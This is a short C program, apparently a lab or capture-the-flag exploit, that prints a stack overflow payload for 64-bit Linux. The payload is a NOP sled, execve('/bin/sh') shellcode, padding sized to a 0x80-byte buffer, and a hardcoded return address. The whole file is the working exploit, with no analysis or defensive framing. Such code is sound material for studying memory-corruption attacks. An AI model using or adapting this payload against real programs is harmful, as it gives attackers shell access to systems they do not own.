#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>

#define BUFFER_SIZE 0x80
#define RBP_OFFSET BUFFER_SIZE + 8
#define RIP_OFFSET RBP_OFFSET + 8
#define STACK_SIZE RBP_OFFSET

#define NOP_OPCODE "\x90"
#define START_PADDING 20

char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";


/* 0x00007fffffffe5c0 */
unsigned char rip_address[] = {
    '\xc0',
    '\xe5',
    '\xff',
    '\xff',
    '\xff',
    '\x7f',
    '\x00',
    '\x00'
};
int main()
{
    int i;

    for (i = 0; i < START_PADDING; i++)
        write(STDOUT_FILENO, NOP_OPCODE, 1);

    write(STDOUT_FILENO, shellcode, sizeof(shellcode));

    /* Always have some padding after the shellcode, as it sometimes uses the stack. So if no padding is added, we could overwrite the shell with pushed instructions*/
    for (i = 0; i < STACK_SIZE - START_PADDING - sizeof(shellcode); i++)
        write(STDOUT_FILENO, NOP_OPCODE, 1);
    write(STDOUT_FILENO, rip_address, sizeof(rip_address));


    

}